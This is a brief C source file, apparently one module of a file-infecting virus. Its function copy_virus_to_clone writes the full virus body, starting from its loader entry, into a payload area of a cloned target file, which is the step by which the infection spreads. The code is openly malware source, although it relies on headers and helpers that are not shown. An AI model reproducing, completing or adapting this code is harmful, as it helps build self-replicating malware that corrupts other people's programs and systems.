#include "virus.h"
#include "utils.h"
#include "errors.h"

bool		copy_virus_to_clone(struct safe_ptr clone_ref,
			size_t payload_offset, const struct virus_header *vhdr)
{
	const size_t	full_virus_size = vhdr->full_virus_size;
	const void	*loader_entry   = vhdr->loader_entry;

	void	*payload = safe(clone_ref, payload_offset, full_virus_size);

	if (payload == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_FULL_VIRUS);

	memcpy(payload, loader_entry, full_virus_size);
	return true;
}
